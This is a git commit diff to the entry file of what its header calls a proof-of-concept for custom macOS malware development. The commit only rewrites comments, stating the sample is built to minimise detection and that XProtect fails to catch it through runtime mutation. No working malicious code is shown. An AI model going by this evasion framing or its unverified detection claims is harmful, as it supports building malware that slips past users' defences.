642449a7a0e13588d5189418f045d31446520922
irqstorm <159052166+irqstorm@users.noreply.github.com>
2025-04-27 03:19:44 +0300

    Ae

--- src/entry.c
+++ src/entry.c
@@ -2,16 +2,16 @@
  * Author: IRQstorm | 3840
  * 
  * Notes:
- * - While macOS Gatekeeper and XProtect may detect anomalies, this sample is written to minimize basic detection.
+ * - This sample is designed to minimize basic detection,
+ * - While macOS Gatekeeper may flag it based on static heuristics, 
+ * - XProtect consistently fails to detect it due to runtime mutation, 
  * - Originally developed from internal research and shared publicly to demonstrate core techniques.
  * - The structure is designed to be easily extendable for updates, operational fixes, and feature additions.
  * 
  * Purpose:
  * Proof-of-Concept (PoC) for demonstrating custom malware development techniques on macOS.
  */
-
-
-#include <wisp.h>
+    #include <wisp.h>
 
 int main() {
     initialize();
